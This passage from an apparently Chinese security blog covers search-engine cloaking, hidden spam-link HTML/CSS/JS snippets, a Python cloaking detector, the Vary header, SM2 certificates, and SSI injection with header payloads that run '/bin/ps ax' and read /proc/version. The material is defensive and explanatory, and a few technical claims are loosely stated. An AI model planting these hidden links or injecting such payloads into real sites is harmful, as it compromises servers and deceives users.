src="/posts/df8abfee/1600871746718-c9db272e-5c37-4060-9b82-dfae1e04c05e.png" class title="img"><p>当一些访问者要访问同一个网站页面时，网站的Cloak程序，通过识别，分类这些访问者，呈现给不同用户特定不同的页面，这个过程叫Cloaking。</p><p>而referer作弊则是黑产针对搜索引擎、大型网站做的黑帽SEO，其他点在于只有通过搜索引擎访问会跳转，直接访问则不会跳转,这是通过判断网页请求头中Referer字段实现的。网站通过搜索引擎访问跳转到博彩页面就是受到了referer作弊攻击。</p><img src="/posts/df8abfee/1600872279124-2180706b-214e-4654-b2fc-341d28017f29.png" class title="img"><h3 id="2-2-User-Agent作弊"><a class="header-anchor" href="#2-2-User-Agent作弊">¶</a>2.2 User-Agent作弊</h3><p>User-Agent与Referer作弊实现效果是相同的，唯一的差别就是Referer作弊是通过判断Referer字段来区分从搜索引擎点击还是直接访问，而User-Agent则是通过判断User-Agent字段。这两者都属于Cloaking技术的应用。</p><p>对于搜索引擎来说，为了区分自身和正常人的行为，爬虫会修改自己的UA为一个公共声明标识的UA如：360spider，这也为黑产对抗留下了入口，黑产从业者会通过js/后端php来进行请求头判断，如果是来自搜索引擎的流量，则展示黑产页面，如果是正常访客的UA则展示正常的页面。这样可以极大加强隐蔽自身的能力。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">baiduBot</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)<br>360spider: 360Spider<br><span class="hljs-attribute">bingBot</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)<br><span class="hljs-attribute">GoogleBot</span><span class="hljs-punctuation">: </span>Googlebot/2.1 (+http://www.googlebot.com/bot.html)<br><span class="hljs-attribute">YahooBot</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)<br></code></pre></td></tr></table></figure><img src="/posts/df8abfee/1600872969311-0d5e1d62-26dc-47c4-a02f-26a394c51dff.png" class title="img"><h3 id="2-3-CSS隐藏"><a class="header-anchor" href="#2-3-CSS隐藏">¶</a>2.3 CSS隐藏</h3><p>CSS隐藏链接是常用的，以下为常用的暗链隐藏方式。</p><p>1.链接位于页面可见范围之外，常通过postion设置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute;left:expression_r(1-900);top:expression_r(3-999);&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键词<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute; top:-999px;right:-999px;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">herf</span>=<span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键词<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-indent:-9999em; display:block;float:left&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">herf</span>=<span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键词<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> 元素向前缩进为负值，即在可见范围之外<br></code></pre></td></tr></table></figure><p>2.修改背景颜色、大小，隐藏链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">herf</span>=<span class="hljs-string">#</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:#FFFFFF; &quot;</span>&gt;</span>关键词<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">herf</span>=<span class="hljs-string">#</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size:1px;&quot;</span>&gt;</span>关键词<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">herf</span>=<span class="hljs-string">#</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;line-height:1px;&quot;</span>&gt;</span>关键词<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.利用跑马灯marquee属性，链接以跑马灯形式迅速闪现，跑马灯的长宽设置很小，同时将闪现的频率设置很大，使得查看页面时不会有任何影响。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">height</span>=<span class="hljs-string">1</span> <span class="hljs-attr">width</span>=<span class="hljs-string">4</span> <span class="hljs-attr">scrollamount</span>=<span class="hljs-string">3000</span> <span class="hljs-attr">scrolldelay</span>=<span class="hljs-string">20000</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>= <span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键字<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">marquee</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.利用display:none和visibility:hidden隐藏区域里的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键字<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;visibility:hidden;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键字  <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-JS控制"><a class="header-anchor" href="#2-4-JS控制">¶</a>2.4 JS控制</h3><p>虽然控制CSS来隐藏链接的依旧是最普遍的，但由于搜索引擎和安全厂商已经对该方法进行发现打击，效果有所下降。黑帽SEO为了避免被搜索引擎识别，使用JS写入CSS或HTML代码以隐藏自己。</p><p>1.JS写入css属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;anlian&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;暗链&quot;</span>&gt;</span>关键字<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;anlian&quot;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span>=<span class="hljs-string">&quot;n&quot;</span>+<span class="hljs-string">&quot;one&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.利用遮挡层隐藏暗链。z-index属性可以设置元素的堆叠顺序，z-index值越小其堆叠顺序越靠后，因此可以利用其它层来遮挡暗链。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;father&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:relative&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;topLever&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute;left:0;top:0;z-index:999; width:90%;height:100px;&quot;</span>&gt;</span> 遮挡层：可以放图片等  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hideDontent&quot;</span>&gt;</span>隐蔽层：可以放暗链<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.利用iframe创建隐藏的内联框架</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span> marginWidth=0 marginHeight=0src=&quot;暗链 &quot; frameBorder=0width=&quot;226&quot; scrolling=no height=3 name=&quot;haitan&quot;&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.利用重定向机制。在跳转之前的页面写入不相关的链接，通过快速跳转到正常页面，使用户无法察觉。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&quot;window.location= &quot;</span>index.<span class="hljs-property">html</span><span class="hljs-string">&quot;,0.1); </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">leftMargin</span>=<span class="hljs-string">0</span> <span class="hljs-attr">topMargin</span>=<span class="hljs-string">0</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">no</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">“暗链”</span>&gt;</span>关键字<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>5.利用<meta>标签插入链接。位于网页html源码头部内的<meta>标签，提供有关页面的元信息，是搜索引擎判定网页内容的主要根据, 攻击者可以在标签中插入大量与网页不相关的词语以及链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;1&quot;</span>; <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;暗链&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxxx&quot;</span><span class="hljs-attr">content</span>=<span class="hljs-string">&quot;黑链及描述&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-对抗策略"><a class="header-anchor" href="#3-对抗策略">¶</a>3 对抗策略</h2><p>目前主流的检测方式有两种，一种是<strong>基于规则的检测方法</strong>，通过经验丰富的人员收集各种样式的黑页并提取关键词、结构。传统基于经验总结的关键词规则在准确率、召回率方面都很难达到令人满意的效果，并且需要耗费许多精力收集黑页并提取规则。所以目前最新方向是<strong>基于机器学习的检测方法</strong>，通过机器学习算法训练暗链检测模型。基于规则校验的工具如: <a href="https://mp.weixin.qq.com/s?__biz=MzIyNDkwNjQ5Ng==&amp;mid=2247484098&amp;idx=1&amp;sn=7fd3d9e0cd15c5911b3134fdcd8ddb3b&amp;chksm=e8069eaddf7117bbe3c8bae34ee97b69f596870b71d7863845ddd365eea5747fe17afc2c6dd7&amp;token=1035630080&amp;lang=zh_CN#rd">dc_find</a>。基于机器学习的检测工具与算法，最终产物以论文为导向，并没有找到可以进行应用的场景，以后有机会可以自己训练再增添到本文中( 数据集难找…),有兴趣的可以在知网搜索暗链检测，论文还是很多的。</p><h2 id="4-工具检测"><a class="header-anchor" href="#4-工具检测">¶</a>4 工具检测</h2><p>这里就简要阐述一下<code>dc_find</code>工具，该工具采用典型的基于规则的检测方法，基本就堆叠关键词。该工具更多的是着眼于<code>网页关键词</code>，尤其是黑产常用的关键词比如: 棋牌、博彩等等。而暗链检测功能比较薄弱，当然我们关键词加的越多，结果就越准确。比较出色的是和fofa进行了联动，并且其中对Referer和UA的欺骗，这一点是很多机器学习算法所忽略的。总体来说，该工具还是可以的，不过想要效果好还需要对规则进行增加和修改。</p><p>按照惯例，本本节也应该开发一款检测工具，但有基于规则的检测工具dc_find和众多机器学习检测算法，就不再重复造轮子了。这里实践一下新思路: 设置不同的UA，根据网站返回内容是否一致来确认该网站是否有可能存在黑页。</p><p>小工具: cloak_find（推荐使用dc_find, 本工具测试效果极不理想…)</p><img src="/posts/df8abfee/1601475702253-23055d42-8486-491c-a41b-a8ef427eeff7.png" class title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 检测函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;https://www.qq.com/&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.get(url,headers=headers,timeout=<span class="hljs-number">5</span>).text<br>        page=<span class="hljs-built_in">len</span>(res)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> bot <span class="hljs-keyword">in</span> bots:<br>        el=bot.split(<span class="hljs-string">&#x27;@&#x27;</span>)<br>        ti=el[<span class="hljs-number">0</span>]<br>        headers[<span class="hljs-string">&#x27;User-Agent&#x27;</span>]= el[<span class="hljs-number">1</span>]<br>        headers[<span class="hljs-string">&#x27;Referer&#x27;</span>]=el[<span class="hljs-number">2</span>]<br>        <span class="hljs-keyword">try</span>:<br>            res=requests.get(url,headers=headers,timeout=<span class="hljs-number">5</span>).text<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res) != page:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]&#123;&#125; bot:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url,ti))<br>                result.append(<span class="hljs-string">&#x27;&#123;&#125; bot:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(url,ti))<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h2 id="5-相关案例"><a class="header-anchor" href="#5-相关案例">¶</a>5 相关案例</h2><p>对于该案例的验证，可以安装Chrome插件 <code>User-Agent Switcher</code>, 可以自定义User-Agent</p><img src="/posts/df8abfee/1611299045060-f4d8b133-016d-4d27-b75a-f5682fc10b91.png" class title="img"><img src="/posts/df8abfee/1611299088515-142e6957-248c-4022-a143-79c21788f50d.png" class title="img"><img src="/posts/df8abfee/1611299127770-20a66479-8b9d-4cfc-9705-67c2f64e73e0.png" class title="img"><img src="/posts/df8abfee/1611299150124-a00b8acc-9396-4262-98e2-88d7f304ffc9.png" class title="img"><hr><h3 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h3><p>黑链是SEO手法中相当普遍的一种手段，笼统地说，它就是指一些人用非正常的手段获取的其它网站的反向链接，最常见的黑链就是通过各种网站程序漏洞<strong>获取搜索引擎权重</strong>或者PR较高的网站的webshell，进而在被黑网站上链接自己的网站，其性质与<strong>明链</strong>一致，都是属于为高效率提升排名，而使用的作弊手法。</p><h3 id="黑链写法"><a class="header-anchor" href="#黑链写法">¶</a>黑链写法</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;www.黑链域名.com&quot;</span>&gt;</span>黑链文本<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>黑链标签被放在一个隐藏的div中。用户在浏览器中是无法看到的，但是在html源代码中可以查看的到。搜索引擎也同样能扑捉到该链接。故而该链接被称作是黑链。</p><h3 id="常见手法"><a class="header-anchor" href="#常见手法">¶</a>常见手法</h3><p>手法一：利用css中的标签display，把黑链的display元素设置为none，也就是让黑链不显示在页面上。</p><p>手法二：利用css中的color元素，把黑链的标签显示颜色调为和网页页面颜色一致，让人肉眼无法看到。</p><p>手法三：利用css的浮动或者定位技术，把黑链浮动或者定位在网页不可浏览到的位置。</p><h2 id="4-Vary响应头"><a class="header-anchor" href="#4-Vary响应头">¶</a>4.Vary响应头</h2><p>Vary头部是HTTP协议中一个重要的响应头，用于指示缓存代理（如浏览器和CDN）在决定如何缓存响应时需要考虑哪些请求头。它类似于一个“提示标签”，告诉浏览器或缓存系统在哪些条件下可能会有内容变化，从而决定是否可以使用缓存的响应而不是从源服务器请求新的响应。</p><p>具体来说，Vary头部由服务器端添加到响应头部，在缓存中读取到该响应时，会读取到相应的头部，并进行一些针对缓存的判断。例如，如果网页的内容取决于用户的语言偏好，那么该页面被称为根据语言而不同，这时服务器会将User-Agent作为Vary头部的一部分，以确保不同用户看到的内容是一致的。</p><p>此外，Vary头部还被用于内容协商算法中，选择资源表示时应该使用哪些头部信息。例如，某些服务器可能会根据客户端支持的数据压缩能力来发送不同的数据格式，这时就会在Vary头部中指定Accept-Encoding字段。</p><p>在实际应用中，例如在Django框架中，可以通过视图装饰器vary_on_headers来控制缓存机制，基于特定的请求头部来构建缓存键值。腾讯云CDN也支持Vary特性，可以根据Accept-Charset头部区分缓存不同的文件版本。</p><p>总之，Vary头部在HTTP协议中起到了至关重要的作用，它不仅帮助服务器和客户端之间更好地沟通和协作，还大大提高了网络资源的访问效率和用户体验.</p><h3 id="Vary头部在HTTP协议中的具体定义和作用是什么？"><a class="header-anchor" href="#Vary头部在HTTP协议中的具体定义和作用是什么？">¶</a>Vary头部在HTTP协议中的具体定义和作用是什么？</h3><p>Vary头部在HTTP协议中是一个响应头部，用于描述除了请求方法和URL之外的其他请求头部字段如何影响响应内容。它主要用于内容协商（Content Negotiation）过程中创建缓存键，以决定哪些请求头部信息会影响资源的选择和响应的内容。</p><p>具体来说，Vary头部告诉缓存系统哪些请求头部字段是重要的，从而可以用来判断未来请求是否可以使用缓存的响应。例如，在使用Content-Negotiation Algorithm时，服务器会根据这些头部信息选择最合适的资源版本，并将这些头部信息包含在Vary头部中。这使得客户端能够知道哪些情况下可以直接使用缓存的内容，哪些情况下需要重新从服务器获取新的内容，从而提高网络浏览体验的顺畅性和效率。</p><p>此外，Vary头部还被用于不可缓存或过期响应中，帮助用户代理选择表述的标准。对于给定的URL，包括304 Not Modified响应和“默认”响应，相同的Vary头部值应该被应用。</p><h3 id="如何配置Vary头部以优化网络资源的访问效率和用户体验？"><a class="header-anchor" href="#如何配置Vary头部以优化网络资源的访问效率和用户体验？">¶</a>如何配置Vary头部以优化网络资源的访问效率和用户体验？</h3><p>配置Vary头部以优化网络资源的访问效率和用户体验，主要涉及以下几个方面：</p><p>**理解Vary头部的作用：**Vary头部用于在HTTP请求中包含可变的输入，告知客户端内容可能会根据不同的请求而变化。例如，如果用户更改了显示方向或窗口宽度，图像是否会改变？使用Vary头部可以指定输入，如Accept-Encoding、User-Agent或Viewport-Width，这有助于正确地向客户端传达内容可能因不同输入而变化的信息。</p><p><strong>避免特定浏览器问题</strong>：对于Internet Explorer（IE）等特定浏览器，Vary头部可能导致每次请求重新验证，而不是缓存，因为这些浏览器无法使用请求头来计算内部缓存密钥。解决IE问题的办法是删除Vary头部并将内容标记为私有。</p><p>**提高网络利用效率：**优化网络利用效率对于确保无缝的用户体验、提高生产力和实现业务目标至关重要。使用内容分发网络（CDN）可以将数据缓存在离用户更近的服务器上，大大减少数据传输时间，从而提升网络资源的访问效率。</p><p>**减少网络延迟：**网络延迟是影响用户体验的主要因素之一。使用CDN可以减少数据传输时间，从而提升用户体验。</p><h2 id="5-国密证书"><a class="header-anchor" href="#5-国密证书">¶</a>5.国密证书</h2><h3 id="什么是国密SSL证书？"><a class="header-anchor" href="#什么是国密SSL证书？">¶</a>什么是国密SSL证书？</h3><p>国密SSL证书是遵循国家标准技术规范并参考国际标准，采用我国自主研发的SM2公钥算法体系，支持SM2、SM3、SM4等国产密码算法及国密SSL安全协议的数字证书。国密SSL证书采用自主可控的密码技术，能够满足政府机构、事业单位、大型国企、金融银行等重点领域用户对HTTPS协议国产化改造和国密算法应用的合规需求。</p><h3 id="国密SSL证书与传统SSL证书的区别？"><a class="header-anchor" href="#国密SSL证书与传统SSL证书的区别？">¶</a>国密SSL证书与传统SSL证书的区别？</h3><p><strong>1.加密算法不同</strong></p><p>传统SSL证书通常采用<strong>RSA算法</strong>，RSA是目前应用最为普遍的加密算法，能够抵御绝大多数的网络攻击，但随着密码技术的飞速发展，已逐渐证实1024位的RSA算法仍然存在被攻破的风险，因此目前很多SSL证书已将RSA算法升级到2048位。</p><p>而现阶段的国密SSL证书采用由<strong>我国自主设计的SM2公钥密码算法</strong>，这种算法<strong>基于椭圆曲线密码理论</strong>改进而来，其加密强度比RSA算法更高。</p><p><strong>2.安全性能不同</strong></p><p>虽然RSA算法目前仍是SSL证书的主流算法，但随着计算机能力的提升以及对因子分解技术的改进，对低位数RSA密钥攻击已成为可能。</p><p>而SM2算法普遍采用256位密钥长度，它的单位安全强度比传统RSA算法高很多，其破译难度呈指数级上升。因此SM2算法可以使用更少的计算能力提供比RSA算法更高的安全强度，而其所需的密钥长度远比RSA更低。根据目前的研究，160位的SM2加密安全性相当于1024位RSA加密，210位SM2加密安全性相当于2048位RSA加密。</p><p><strong>3.传输速度不同</strong></p><p>在通信过程中，更长的密钥意味着必须收发更多的数据来验证连接。SM2算法采用更短的密钥长度，只需要使用更少的网络负载和计算能力，可以大大减少SSL握手时间，缩短网站响应时间。</p><p>经国外有关权威机构测试，在Web服务器中采用SM2算法，服务器新建并发处理响应时间比RSA算法快十几倍。</p><p><strong>4.拥有自主可控权</strong></p><p>传统SSL证书主要依赖于国外CA机构，一旦国外证书品牌对我国执行断供、吊销，我国各类重要领域的网站或信息管理系统，将面临大规模访问故障和巨大的数据安全泄露风险。而国密SSL证书由国内机构签发，采用自主可控加密算法，无需担心被国外断供的风险。</p><p>今年俄乌冲突爆发，大量俄政府和银行等重要网站的SSL证书被吊销，这给我国互联网安全特别是关键信息基础设施安全敲响了警钟。网络安全是国家安全的重要一环，实现网络安全技术的全面自主可控至关重要，其中关键是密码技术的国产化。国密SSL证书采用自主可控的数据加密技术，保护互联网中重要信息流转的数据安全，对提升我国网络信息安全与自主可控水平，具有重要战略意义。</p><h2 id="6-SSI注入"><a class="header-anchor" href="#6-SSI注入">¶</a>6.SSI注入</h2><h3 id="漏洞描述"><a class="header-anchor" href="#漏洞描述">¶</a>漏洞描述</h3><p>SSI 英文是 <strong>Server Side Includes</strong> 的缩写，翻译成中文就是<strong>服务器端包含</strong>的意思。从技术角度上说，SSI 就是在 HTML 文件中，可以通过注入注释调用的命令或指针。SSI 具有强大的功能，只要使用一条简单的 SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行 shell 和 CGI 脚本程序等复杂的功能。SSI 可以称得上是那些资金短缺、时间紧张、工作量大的网站开发人员的最佳帮手。</p><p>**服务器端包含提供了一种对现有 HTML 文档增加动态内容的方法。**Apache 和 IIS 都可以通过配置支持 SSI，在网页内容被返回给用户之前，服务器会执行网页内容中的 SSI 标签。在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射 XSS 漏洞的页面，如果输入的 payload 不是 XSS 代码而是 SSI 标签，服务器又开启了 SSI 支持的话就会存在 SSI 漏洞。</p><h3 id="检测条件"><a class="header-anchor" href="#检测条件">¶</a>检测条件</h3><p>1、Web 服务器已支持 SSI。</p><p>2、Web 应用程序在返回 HTML 页面时，嵌入用户输入。</p><p>3、参数值未进行输入清理。</p><p>检测方法<br>①、黑盒测试</p><p>通过信息收集技术，了解我们的检测目标运行哪些类型的 Web 服务器，查看检测网站的内容来猜测是否支持 SSI，由于 .shtml 文件后缀名是用来表明网页文件是否包含 SSI 指令的，因此如果该网站使用了 .shtml 文件，那说明该网站支持 SSI 指令。然而 .shtml 后缀并非强制规定的，因此如果没有发现任何 .shtml 文件，并不意味目标网站没有 SSI 注入漏洞。</p><p>接下来的步骤就是是否可以进行 SSI 注入攻击，还有恶意代码的注入点。我们需要找到运行用户输入的每一个页面，并确认应用程序是否正确验证了所提交的输入，反之则确认是否存在按输入原样显示的数据（如错误信息、论坛发帖等）。除了常见的用户提供的数据外，还要考虑 HTTP 请求头和 Cookie 内容。</p><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET/HTTP/1.0<br><br>Referer:<span class="hljs-comment">&lt;!--#exec cmd=&quot;/bin/psax&quot;--&gt;</span><br><br>User-Agent: <span class="hljs-comment">&lt;!--#virtualinclude=&quot;/proc/version&quot;--&gt;</span><br></code></pre></td></tr></table></figure><p>②、白盒测试</p><p>1、是否使用 SSI 指令，如果使用，则 Web 服务器就启动了 SSI 支持。这就导致 SSI 注入至少成为需要调查的潜在问题；</p><p>2、用户输入、Cookie 内容和 HTTP 标题头在哪里处理；</p><p>3、如何处理输入、使用什么样的过滤方式、应用程序不允许什么样的字符通过、考虑了多少种编码方式。使用 grep 执行这些步骤，找到源代码中的正确关键字（SSI 指令、CGI 环境变量、涉及用户输入的变量任务、过滤函数等等）。</p><h3 id="防御方法"><a class="header-anchor" href="#防御方法">¶</a>防御方法</h3><p>1、清除用户输入，禁止可能支持 SSI 的模式</p><p>2、过滤敏感字符，比如（ <code>**&lt;**</code> , <code>**&gt;**</code> , <code>**#**</code> , <code>**-**</code> , 